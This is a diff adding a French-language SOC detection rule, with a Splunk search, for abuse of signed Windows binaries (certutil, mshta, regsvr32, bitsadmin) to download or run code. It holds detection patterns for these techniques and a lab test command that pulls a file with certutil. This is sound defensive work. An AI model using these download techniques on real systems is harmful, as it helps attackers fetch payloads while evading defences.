@@ -1,0 +1,105 @@
+title: Utilisation de LOLBin pour telechargement ou execution
+id: DM-WIN-009
+status: draft
+description: >
+  Detecte l'abus de binaires natifs (certutil, mshta, regsvr32, bitsadmin) pour telecharger ou executer du code.
+author: Groupe 2 - Jonas FONTAINE-DEMAY
+date: 2026/11/02
+modified: 2026/11/02
+references:
+- https://attack.mitre.org/techniques/T1218/
+tags:
+- attack.defense_evasion
+- attack.t1218
+killchain: Execution / evasion de defense
+attack_summary:
+  mechanism: Utilisation de binaires signes Microsoft pour telecharger ou executer des payloads.
+  attacker_prerequisites: Execution de commandes sur l'hote.
+  environment_prerequisites: Binaires natifs non restreints.
+  complexity: faible
+logsource:
+  product: windows
+  category: process_creation
+  service: sysmon
+data_requirements:
+- source: WinEventLog:Microsoft-Windows-Sysmon/Operational
+  event_ids:
+  - '1'
+  audit_policy: Process Creation (sysmon-modular)
+  collected_on: tous
+  verified_in_splunk: false
+  notes: ''
+detection:
+  selection:
+    CommandLine|contains:
+    - certutil*-urlcache
+    - mshta*http
+    - regsvr32*/i:http
+    - bitsadmin*/transfer
+  condition: selection
+fields:
+- ComputerName
+- User
+- Image
+- CommandLine
+- ParentImage
+level: medium
+severity_rationale: >
+  Technique tres utilisee mais avec des usages legitimes; MEDIUM.
+severity_modifiers:
+- +1 si l'actif est critique (DC, bastion) ou si un compte privilegie ou VIP est implique
+- +1 si plusieurs regles se declenchent pour la meme source
+falsepositives:
+- Scripts d'administration
+- Outils de deploiement
+exclusions:
+  mechanism: lookup CSV (ParentImage, User)
+  entries: []
+known_evasions:
+- Variantes de syntaxe et binaires non listes
+design_choice: >
+  Liste ciblee sur les motifs de telechargement pour limiter le bruit.
+splunk:
+  alert_name: '[BUILD] [MEDIUM] Utilisation de LOLBin pour telechargement ou execution'
+  app: SA_BUILD
+  sharing: app
+  index: main
+  cron: '*/5 * * * *'
+  earliest: -10m@m
+  latest: -5m@m
+  trigger: number of results > 0
+  trigger_mode: once
+  throttle:
+    fields: ComputerName,CommandLine
+    period: 1h
+  webhook_url: http://soc_n8n:5678/webhook/alert
+  search: |
+    index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
+    ((Image="*\\certutil.exe" CommandLine="*urlcache*") OR (Image="*\\mshta.exe" CommandLine="*http*")
+    OR (Image="*\\regsvr32.exe" CommandLine="*/i:http*") OR (Image="*\\bitsadmin.exe" CommandLine="*/transfer*"))
+    | table _time ComputerName User Image CommandLine ParentImage
+response:
+  containment:
+  - Isoler l'hote si le contenu telecharge est malveillant
+  remediation:
+  - Restreindre ces binaires par AppLocker
+  do_not:
+  - Ne pas executer le payload telecharge hors d'un bac a sable
+investigation:
+  playbook: Investigation/fiches_reflexes/DM-WIN-009.md
+  pivots:
+  - P-PROC-TREE
+  - P-NET-CONN
+  client_notification: non - qualification sous 8h (SLA MEDIUM)
+tests:
+- date: ''
+  environment: lab DC/SRV/Kali
+  command: certutil -urlcache -f http://192.168.10.200/a.txt a.txt
+  expected: Alerte MEDIUM dans Splunk puis DFIR-IRIS
+  result: non teste
+  evidence: ''
+untestable_reason: ''
+changelog:
+- date: 2026/11/02
+  author: Jonas FONTAINE-DEMAY
+  change: Creation (draft)
